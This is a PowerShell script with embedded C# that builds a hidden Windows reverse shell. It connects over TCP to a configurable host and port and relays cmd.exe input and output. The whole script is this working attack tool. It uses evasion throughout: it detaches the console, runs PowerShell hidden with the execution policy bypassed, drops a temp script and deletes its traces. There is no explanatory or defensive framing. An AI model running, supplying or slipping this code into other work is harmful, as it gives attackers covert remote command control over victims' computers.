# Completely silent execution - NO window flash
$env:target = "0.0.0.0"
$env:port = "4444"

$cmdShell = @"
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Runtime.InteropServices;

public class CmdShell {
    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();
    
    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    
    [DllImport("kernel32.dll")]
    static extern bool FreeConsole();
    
    public static void Main() {
        // Completely detach from console - no window at all
        FreeConsole();
        
        try {
            TcpClient client = new TcpClient("$env:target", $env:port);
            NetworkStream stream = client.GetStream();
            StreamReader reader = new StreamReader(stream, Encoding.ASCII);
            StreamWriter writer = new StreamWriter(stream, Encoding.ASCII) { AutoFlush = true };
            
            Process cmd = new Process();
            cmd.StartInfo.FileName = "cmd.exe";
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.RedirectStandardError = true;
            cmd.StartInfo.UseShellExecute = false;
            cmd.StartInfo.CreateNoWindow = true;
            cmd.Start();
            
            // Async output reading
            var outputTask = System.Threading.Tasks.Task.Run(() => {
                char[] buffer = new char[1024];
                int bytesRead;
                while ((bytesRead = cmd.StandardOutput.Read(buffer, 0, buffer.Length)) > 0) {
                    string output = new string(buffer, 0, bytesRead);
                    writer.Write(output);
                }
            });
            
            // Main command loop
            string command;
            while ((command = reader.ReadLine()) != null) {
                if (command.ToLower() == "exit") break;
                cmd.StandardInput.WriteLine(command);
            }
            
            cmd.Kill();
            client.Close();
        } catch {}
    }
}
"@

# Create a temporary PowerShell script and run it completely hidden
$tempScript = [System.IO.Path]::GetTempFileName() + ".ps1"
@"
Add-Type -TypeDefinition '$cmdShell' -Language CSharp
[CmdShell]::Main()
Remove-Item Env:target, Env:port -ErrorAction SilentlyContinue
"@ | Out-File -FilePath $tempScript -Encoding ASCII

# Execute with absolute zero visibility
$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = "powershell.exe"
$psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$tempScript`""
$psi.CreateNoWindow = $true
$psi.UseShellExecute = $false
$psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden

$process = New-Object System.Diagnostics.Process
$process.StartInfo = $psi
$process.Start() | Out-Null

# Cleanup temp file after execution
Start-Sleep -Seconds 2
Remove-Item $tempScript -Force -ErrorAction SilentlyContinue